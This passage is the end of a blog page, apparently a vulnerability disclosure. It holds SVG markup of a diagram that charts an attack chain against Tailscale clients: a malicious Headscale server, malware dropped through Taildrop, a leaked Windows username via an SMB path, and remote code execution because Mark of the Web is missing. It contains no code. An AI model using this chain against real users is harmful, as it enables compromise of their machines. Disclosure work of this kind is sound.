<polygon fill="#404040" stroke="#404040" points="674.4125,-258.0101 673.9755,-247.4243 667.7158,-255.9722 674.4125,-258.0101"></polygon>
<text text-anchor="middle" x="816.0987" y="-269.4" font-family="sans-serif" font-size="14.00" fill="#000000"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LocalAPI + Control configure target as exit node</text>
</g>
<!-- Malware placed on Desktop -->
<g id="node18" class="node">
<title>Malware placed on Desktop</title>
<ellipse fill="none" stroke="#000000" cx="464.1103" cy="-229.2" rx="119.7675" ry="18"></ellipse>
<text text-anchor="middle" x="464.1103" y="-225" font-family="sans-serif" font-size="14.00" fill="#000000">Malware placed on Desktop</text>
</g>
<!-- Target joins malicious Headscale&#45;&gt;Malware placed on Desktop -->
<g id="edge21" class="edge">
<title>Target joins malicious Headscale-&gt;Malware placed on Desktop</title>
<path fill="none" stroke="#404040" d="M480.3182,-299.7016C477.6656,-294.1416 475.0149,-287.9313 473.1481,-282 470.702,-274.2282 468.8716,-265.592 467.522,-257.5932"></path>
<polygon fill="#404040" stroke="#404040" points="470.9631,-256.9392 466.0135,-247.5716 464.0411,-257.9812 470.9631,-256.9392"></polygon>
<text text-anchor="middle" x="565.0914" y="-269.4" font-family="sans-serif" font-size="14.00" fill="#000000"> &nbsp;&nbsp;Taildrop within new Tailnet &nbsp;&nbsp;&nbsp;</text>
</g>
<!-- Windows Username known -->
<g id="node19" class="node">
<title>Windows Username known</title>
<ellipse fill="none" stroke="#000000" cx="391.1103" cy="-123.6" rx="118.1082" ry="18"></ellipse>
<text text-anchor="middle" x="391.1103" y="-119.4" font-family="sans-serif" font-size="14.00" fill="#000000">Windows Username known</text>
</g>
<!-- Malware placed on Desktop&#45;&gt;Windows Username known -->
<g id="edge22" class="edge">
<title>Malware placed on Desktop-&gt;Windows Username known</title>
<path fill="none" stroke="#404040" d="M461.6874,-211.1771C458.9521,-196.2044 453.3268,-174.9469 442.1103,-159.6 438.8728,-155.1703 434.9213,-151.0848 430.6648,-147.3805"></path>
<polygon fill="#404040" stroke="#404040" points="432.7773,-144.589 422.7621,-141.1326 428.436,-150.0801 432.7773,-144.589"></polygon>
<text text-anchor="middle" x="551.4199" y="-172.2" font-family="sans-serif" font-size="14.00" fill="#000000"> &nbsp;&nbsp;&nbsp;Bug 2: Control pops SMB path</text>
</g>
<!-- Windows Username known&#45;&gt;RCE -->
<g id="edge24" class="edge">
<title>Windows Username known-&gt;RCE</title>
<path fill="none" stroke="#404040" d="M355.4367,-106.3985C314.8442,-86.8251 248.9152,-55.0347 208.1649,-35.3852"></path>
<polygon fill="#404040" stroke="#404040" points="209.6521,-32.2167 199.1243,-31.026 206.6117,-38.522 209.6521,-32.2167"></polygon>
<text text-anchor="middle" x="437.556" y="-75" font-family="sans-serif" font-size="14.00" fill="#000000">Bug 2: Control pops malware path</text>
<text text-anchor="middle" x="437.556" y="-58.2" font-family="sans-serif" font-size="14.00" fill="#000000">Bug 3: Mark of the Web not set by Taildrop</text>
</g>
</g>
</svg>
</div></article><footer class="mt-20 pb-16 lt-sm:pb-8 lt-sm:mt-16"><p class="flex items-center gap-2.5 text-gray-400/800 dark:text-gray-500/800 text-sm"><span>Powered by <a class="inline-flex items-center gap-1 underline hover:text-gray-800 dark:hover:text-gray-200 transition-colors" href="https://deno.land/x/blog">Deno Blog</a></span><a href="/feed" class="inline-flex items-center gap-1 hover:text-gray-800 dark:hover:text-gray-200 transition-colors" title="Atom Feed"><svg class="inline-block w-4 h-4" viewBox="0 0 20 20" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="M5 3a1 1 0 000 2c5.523 0 10 4.477 10 10a1 1 0 102 0C17 8.373 11.627 3 5 3z"></path><path d="M4 9a1 1 0 011-1 7 7 0 017 7 1 1 0 11-2 0 5 5 0 00-5-5 1 1 0 01-1-1zM3 15a2 2 0 114 0 2 2 0 01-4 0z"></path></svg> RSS</a></p></footer><script src="https://accepted-terrific.emily.id.au/script.js" data-site="JUXOZDXM" data-spa="auto" defer></script><link rel="me" href="https://hachyderm.io/@emilyposting" /></div></div></body></html>